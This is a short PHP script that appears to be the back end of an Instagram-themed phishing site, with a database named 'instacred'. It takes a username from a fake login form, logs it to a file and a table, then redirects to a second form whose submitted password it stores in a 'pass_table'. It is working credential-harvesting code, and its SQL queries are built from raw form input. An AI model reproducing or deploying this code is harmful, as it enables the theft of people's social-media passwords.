<?php
include 'users.php';

$hostname = "localhost";
$username = "instagram";
$password = "helloworld";
$db = "instacred";

$dbconnect=mysqli_connect($hostname,$username,$password,$db);

if ($dbconnect->connect_error) {
  die("Database connection failed: " . $dbconnect->connect_error);
}

date_default_timezone_set('Asia/kolkata');
$date = date('d-m-y H:i a');

if(isset($_POST['submit0'])) {
  $uname=$_POST['uname'];

foreach ($users as &$value){
if($value==$uname){
//header('location:loginerror.html');
$myfile = fopen("newfile.txt", "w") or die("Unable to open file!");
fwrite($myfile, $uname);
fclose($myfile);
  $query = "INSERT INTO user_table (uname,  date)
  VALUES ('$uname', '$date')";

    if (!mysqli_query($dbconnect, $query)) {
        die('An error occurred. Your review has not been submitted.');
    } else {
      echo "Wait...";
    }
header('location:login2.php');
//break;
}
}
//header('location:loginerror.html');
}

if(isset($_POST['submit2'])) {
  $pass=$_POST['pass'];

  $query = "INSERT INTO pass_table (pass,  date)
  VALUES ('$pass', '$date')";

    if (!mysqli_query($dbconnect, $query)) {
        die('An error occurred. Your review has not been submitted.');
    } else {
      echo "Wait...";
    }
header('location:html2/index.html');
}

?>
